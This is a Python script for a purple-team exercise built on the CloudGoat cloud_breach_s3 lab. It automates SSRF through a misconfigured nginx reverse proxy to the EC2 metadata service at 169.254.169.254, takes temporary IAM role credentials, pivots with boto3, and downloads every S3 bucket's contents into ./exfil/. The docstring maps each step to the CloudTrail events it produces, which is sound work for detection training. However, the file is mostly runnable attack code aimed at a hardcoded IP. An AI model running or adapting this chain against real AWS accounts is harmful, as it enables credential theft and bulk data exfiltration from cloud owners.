"""
Purple Team Automation — Scenario 1: S3 Misconfiguration & Data Exfiltration
CloudGoat scenario: cloud_breach_s3


Attack chain:
  Step 1 — SSRF: exploit misconfigured nginx reverse proxy to reach EC2 metadata service
           First request  → get IAM role name attached to EC2
           Second request → steal temporary credentials (AccessKeyId + SecretAccessKey + Token)
  Step 2 — Pivot: authenticate as the stolen EC2 role identity
  Step 3 — Exfil: list and download all S3 bucket contents

CloudTrail events produced:
  Step 1 → No CloudTrail events (SSRF hits metadata service, not AWS API)
  Step 2 → sts:GetCallerIdentity (stolen EC2 role identity)
  Step 3 → s3:ListBuckets, s3:ListObjects, s3:GetObject (stolen EC2 role identity)

Key concepts:
  - SSRF: trick nginx into forwarding requests to internal metadata service
  - 169.254.169.254: fixed AWS metadata service IP, only reachable from inside EC2
  - Temporary credentials: 3 pieces (AccessKeyId + SecretAccessKey + Token)
  - Token field in metadata response = SessionToken in boto3

Output: timestamped terminal output + attack_log_scenario1.txt
        Exfiltrated files saved to ./exfil/
"""

import boto3
import requests
import os
import sys
from datetime import datetime

# ============================================================
# CONFIG — edit these values before running on the target lab
# ============================================================
EC2_IP  = "100.53.52.115"   # provided by CloudGoat after deployment
REGION  = "us-east-1"
LOG_FILE = "attack_log_scenario1.txt"
# ============================================================


def log(message):
    """Print to terminal and write to log file simultaneously."""
    timestamped = f"[{datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}] {message}"
    print(timestamped)
    with open(LOG_FILE, "a") as f:
        f.write(timestamped + "\n")


# ----------------------------------------------------------
# Step 1: SSRF — steal EC2 credentials via reverse proxy
# ----------------------------------------------------------
def steal_credentials_via_ssrf(ec2_ip):
    log(f"STEP 1 — SSRF: targeting misconfigured reverse proxy at {ec2_ip}")
    log(f"Technique: set Host header to 169.254.169.254 to reach EC2 metadata service")
    log(f"Why: metadata service only reachable from inside EC2 — nginx forwards blindly")

    metadata_base = f"http://{ec2_ip}/latest/meta-data/iam/security-credentials/"
    headers = {'Host': '169.254.169.254'}

    # Request 1 — get the IAM role name attached to this EC2
    try:
        log(f"Request 1: finding IAM role name attached to EC2...")
        log(f"URL: {metadata_base}")
        log(f"Host header: 169.254.169.254 (this is the SSRF trick)")

        response = requests.get(metadata_base, headers=headers, timeout=10)

        if response.status_code != 200:
            log(f"ERROR — metadata service returned HTTP {response.status_code}")
            log(f"Possible reasons:")
            log(f"  - EC2 not reachable (check IP and security group)")
            log(f"  - SSRF not working (nginx may be patched)")
            log(f"  - EC2 using IMDSv2 (requires PUT token first)")
            return None

        role_name = response.text.strip()
        log(f"SUCCESS — IAM role name found: {role_name}")

    except requests.exceptions.ConnectionError:
        log(f"ERROR — Cannot connect to {ec2_ip}. Is the EC2 running?")
        return None
    except Exception as e:
        log(f"ERROR — Request 1 failed: {e}")
        return None

    # Request 2 — get actual credentials for that role
    try:
        log(f"Request 2: stealing credentials for role: {role_name}")
        cred_url = metadata_base + role_name
        log(f"URL: {cred_url}")

        response = requests.get(cred_url, headers=headers, timeout=10)
        creds = response.json()

        log(f"SUCCESS — Temporary credentials stolen via SSRF:")
        log(f"  Access Key ID : {creds['AccessKeyId'][:6]}... (truncated)")
        log(f"  Type          : {creds['Type']}")
        log(f"  Expiration    : {creds['Expiration']}")
        log(f"  Note: credentials expire at {creds['Expiration']} — use them quickly")

        return creds

    except Exception as e:
        log(f"ERROR — Request 2 failed: {e}")
        return None


# ----------------------------------------------------------
# Step 2: Pivot — authenticate as stolen EC2 role
# ----------------------------------------------------------
def pivot_with_stolen_credentials(creds, region):
    log("STEP 2 — Pivoting: authenticating as stolen EC2 role identity")
    log("API call: sts:GetCallerIdentity (using stolen temporary credentials)")
    log("Note: Token field in metadata response = SessionToken in boto3")

    try:
        # Temporary credentials need all three pieces
        # 'Token' in metadata response = aws_session_token in boto3
        stolen_session = boto3.Session(
            aws_access_key_id     = creds['AccessKeyId'],
            aws_secret_access_key = creds['SecretAccessKey'],
            aws_session_token     = creds['Token'],   # ← called 'Token' not 'SessionToken'
            region_name           = region
        )

        sts = stolen_session.client('sts')
        identity = sts.get_caller_identity()

        log(f"SUCCESS — Now authenticated as EC2 role:")
        log(f"  Account : {identity['Account']}")
        log(f"  ARN     : {identity['Arn']}")
        log(f"  UserID  : {identity['UserId']}")

        return stolen_session

    except Exception as e:
        log(f"ERROR — Pivot failed: {e}")
        log(f"Possible reason: credentials expired (they last ~1-6 hours)")
        return None


# ----------------------------------------------------------
# Step 3: Exfiltration — list and download S3 bucket contents
# ----------------------------------------------------------
def exfiltrate_s3(stolen_session):
    log("STEP 3 — Exfiltration: listing and downloading S3 buckets")
    log("API calls: s3:ListBuckets, s3:ListObjects, s3:GetObject")
    log("Identity: stolen EC2 role (not original attacker identity)")

    s3 = stolen_session.client('s3')

    # List all buckets accessible to this role
    try:
        buckets = s3.list_buckets()['Buckets']
        log(f"Found {len(buckets)} S3 bucket(s):")
        for bucket in buckets:
            log(f"  - {bucket['Name']}")

    except Exception as e:
        log(f"ERROR — Could not list buckets: {e}")
        return

    # Download all objects from every bucket
    for bucket in buckets:
        bucket_name = bucket['Name']
        log(f"Accessing bucket: {bucket_name}")

        try:
            objects = s3.list_objects_v2(
                Bucket=bucket_name
            ).get('Contents', [])

            if not objects:
                log(f"  Bucket is empty — skipping")
                continue

            log(f"  Found {len(objects)} object(s):")

            # Create local folder for this bucket's files
            local_dir = f"./exfil/{bucket_name}"
            os.makedirs(local_dir, exist_ok=True)

            for obj in objects:
                key        = obj['Key']
                size       = obj['Size']
                local_path = f"{local_dir}/{key.replace('/', '_')}"

                log(f"  Downloading: {key} ({size} bytes)")
                s3.download_file(bucket_name, key, local_path)
                log(f"  Saved to   : {local_path}")

        except Exception as e:
            log(f"  ERROR — Could not access {bucket_name}: {e}")
            continue

    log(f"Exfiltration complete — all files saved to ./exfil/")


# ----------------------------------------------------------
# Main — wire all steps together
# ----------------------------------------------------------
def main():
    log("=" * 60)
    log("Purple Team — Scenario 1: cloud_breach_s3")
    log("Attack: SSRF → credential theft → S3 exfiltration")
    log("=" * 60)
    log(f"Target EC2 IP : {EC2_IP}")
    log(f"Region        : {REGION}")
    log("=" * 60)

    # Validate config
    if "REPLACE" in EC2_IP:
        log("ERROR — EC2_IP not configured.")
        log("Deploy CloudGoat first: cloudgoat create cloud_breach_s3")
        log("Then set EC2_IP to the IP address CloudGoat provides")
        sys.exit(1)

    # Step 1 — SSRF: steal credentials from EC2 metadata service
    creds = steal_credentials_via_ssrf(EC2_IP)
    if not creds:
        log("ABORTED — Could not steal credentials via SSRF. Stopping.")
        sys.exit(1)

    # Step 2 — Pivot: authenticate as stolen identity
    stolen_session = pivot_with_stolen_credentials(creds, REGION)
    if not stolen_session:
        log("ABORTED — Pivot failed. Stopping.")
        sys.exit(1)

    # Step 3 — Exfil: download everything from S3
    exfiltrate_s3(stolen_session)

    log("=" * 60)
    log("ATTACK CHAIN COMPLETE")
    log(f"Log file     : {LOG_FILE}")
    log(f"Stolen files : ./exfil/")
    log("=" * 60)


if __name__ == "__main__":
    main()
